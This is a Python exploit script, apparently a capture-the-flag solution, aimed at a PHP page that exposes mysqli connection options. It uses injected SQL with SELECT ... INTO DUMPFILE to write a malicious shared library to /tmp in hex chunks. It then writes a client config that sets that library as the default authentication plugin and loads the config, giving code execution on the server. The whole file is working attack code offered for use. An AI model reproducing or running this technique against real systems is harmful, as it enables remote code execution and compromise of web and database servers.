import requests
import random
import string

MYSQLI_INIT_COMMAND = 3
MYSQLI_READ_DEFAULT_FILE = 4

def genName():
    return random.choice(string.ascii_letters) + random.choice(string.ascii_letters) + random.choice(string.ascii_letters)+ random.choice(string.ascii_letters) + random.choice(string.ascii_letters) + random.choice(string.ascii_letters) + random.choice(string.ascii_letters) +random.choice(string.ascii_letters)

url = "http://192.168.194.128:10047/index.php"

with open('evilplugin.so','rb') as f:
    shell = f.read().hex()

chunk_size = 100
chunks = [shell[i:i + chunk_size] for i in range(0, len(shell), chunk_size)]

prefix = genName()

for i in range(len(chunks)):
    name = '/tmp/e10adc3949ba59abbe56e057f20f883e/' + prefix + '_CHUNK' + str(i)
    chunk = '0x' + chunks[i]
    if i != 0 and i != len(chunks) - 1:
        previous_name = '/tmp/e10adc3949ba59abbe56e057f20f883e/' + prefix + '_CHUNK' + str(i - 1)
        sql = f"SELECT concat(LOAD_FILE('{previous_name}'), {chunk}) INTO DUMPFILE '{name}'"
        r = requests.get(url, params={"key":MYSQLI_INIT_COMMAND, "value":sql})
        print(r.text)
        print(name)
    elif i == len(chunks) - 1:
        previous_name = '/tmp/e10adc3949ba59abbe56e057f20f883e/' + prefix + '_CHUNK' + str(i - 1)
        sql = f"SELECT concat(LOAD_FILE('{previous_name}'), {chunk}) INTO DUMPFILE '/tmp/e10adc3949ba59abbe56e057f20f883e/auth_simple.so'"
        r = requests.get(url, params={"key":MYSQLI_INIT_COMMAND, "value":sql})
        print(r.text)
        print('/tmp/e10adc3949ba59abbe56e057f20f883e/auth_simple.so')
    else:
        sql = f"SELECT {chunk} INTO DUMPFILE '{name}'"
        r = requests.get(url, params={"key":MYSQLI_INIT_COMMAND, "value":sql})
        print(r.text)
        print(name)

conf_name = '/tmp/e10adc3949ba59abbe56e057f20f883e/new.cnf'
conf_payload = b'''[client]
plugin_dir = /tmp/e10adc3949ba59abbe56e057f20f883e/
default_auth = auth_simple
'''.hex()
sql = f"SELECT 0x{conf_payload} INTO DUMPFILE '{conf_name}'"
r = requests.get(url, params={"key":MYSQLI_INIT_COMMAND, "value":sql})
print(r.text)
r = requests.get(url, params={"key":MYSQLI_READ_DEFAULT_FILE, "value":'/tmp/e10adc3949ba59abbe56e057f20f883e/new.cnf'})
print(r.text)
